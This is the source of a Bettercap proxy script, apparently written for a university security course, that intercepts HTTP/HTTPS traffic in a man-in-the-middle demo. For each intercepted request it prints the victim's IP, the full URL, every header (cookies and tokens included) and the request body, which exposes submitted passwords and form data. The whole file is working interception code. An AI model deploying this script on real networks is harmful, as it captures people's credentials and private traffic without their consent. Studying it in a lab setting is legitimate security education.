/**
 * mitm_http.js
 * ============
 * Script de Bettercap para interceptar y mostrar peticiones HTTP/HTTPS completas.
 * Proyecto U2 - Seguridad Informática
 *
 * Muestra por pantalla:
 *  - Método (GET, POST, PUT, DELETE, PATCH...)
 *  - URL completa
 *  - Host e IP de origen
 *  - Todos los headers de la petición
 *  - Body completo (si existe)
 *  - Código de respuesta HTTP
 *
 * Se carga automáticamente desde mitm_demo.cap con:
 *   set http.proxy.script  keylogger/mitm_http.js
 *   set https.proxy.script keylogger/mitm_http.js
 */

// ─────────────────────────────────────────────────────────────────────────────
// Helpers de formato
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Retorna la hora actual en formato HH:MM:SS.
 * @returns {string}
 */
function timestamp() {
    return new Date().toTimeString().split(' ')[0];
}

/**
 * Genera una línea separadora decorativa.
 * @param {string} char  - Carácter a repetir.
 * @param {number} width - Longitud total.
 * @returns {string}
 */
function separator(char, width) {
    var s = '';
    for (var i = 0; i < width; i++) { s += char; }
    return s;
}

/**
 * Clasifica el método HTTP con un emoji indicativo para lectura rápida.
 * @param {string} method
 * @returns {string}
 */
function methodTag(method) {
    var tags = {
        'GET':     '[GET    ]',
        'POST':    '[POST   ]',
        'PUT':     '[PUT    ]',
        'DELETE':  '[DELETE ]',
        'PATCH':   '[PATCH  ]',
        'HEAD':    '[HEAD   ]',
        'OPTIONS': '[OPTIONS]',
        'CONNECT': '[CONNECT]',
    };
    return tags[method] || ('[' + method + ']');
}

// ─────────────────────────────────────────────────────────────────────────────
// Callbacks de Bettercap
// ─────────────────────────────────────────────────────────────────────────────

/**
 * onRequest — se llama por cada petición HTTP/HTTPS interceptada.
 * Imprime toda la información de la petición en pantalla.
 *
 * @param {Object} req  - Objeto de petición de Bettercap.
 *   req.Method       : string  — Verbo HTTP (GET, POST, etc.)
 *   req.URL          : string  — URL completa de la petición
 *   req.Host         : string  — Cabecera Host
 *   req.RemoteAddr   : string  — IP:puerto del cliente (víctima)
 *   req.Headers      : object  — Diccionario de cabeceras
 *   req.Body         : string  — Cuerpo de la petición (puede ser vacío)
 */
function onRequest(req) {
    var W = 65;
    var ts = timestamp();
    var method = req.Method || 'UNKNOWN';

    log('\n' + separator('═', W));
    log('  PETICIÓN HTTP INTERCEPTADA  —  ' + ts);
    log(separator('─', W));
    log('  ' + methodTag(method) + '  ' + req.URL);
    log('  Host   : ' + req.Host);
    log('  Origen : ' + req.RemoteAddr);
    log(separator('─', W));

    // ── Headers ──────────────────────────────────────────────────────────────
    log('  HEADERS:');
    var headers = req.Headers;
    if (headers) {
        for (var name in headers) {
            log('    ' + name + ': ' + headers[name]);
        }
    } else {
        log('    (sin headers)');
    }

    // ── Body (solo si existe) ─────────────────────────────────────────────────
    if (req.Body && req.Body.length > 0) {
        log(separator('─', W));
        log('  BODY (' + req.Body.length + ' bytes):');
        // Mostrar máximo 2048 chars para no saturar la terminal
        if (req.Body.length > 2048) {
            log('  ' + req.Body.substring(0, 2048));
            log('  ... [truncado — ' + (req.Body.length - 2048) + ' bytes restantes]');
        } else {
            log('  ' + req.Body);
        }
    } else {
        log(separator('─', W));
        log('  BODY: (vacío)');
    }

    log(separator('═', W) + '\n');
}

/**
 * onResponse — se llama por cada respuesta HTTP/HTTPS interceptada.
 * Muestra una línea resumida con el código de estado.
 *
 * @param {Object} req  - Petición original.
 * @param {Object} res  - Objeto de respuesta de Bettercap.
 *   res.Status      : number — Código HTTP (200, 301, 404, 500, etc.)
 *   res.ContentType : string — Tipo MIME del contenido
 */
function onResponse(req, res) {
    var status = res.Status || '???';
    var ct = res.ContentType || '';
    var ts = timestamp();
    log('  [' + ts + '] RESPUESTA  HTTP ' + status + '  ←  ' +
        req.Method + ' ' + req.URL +
        (ct ? '  (' + ct + ')' : ''));
}
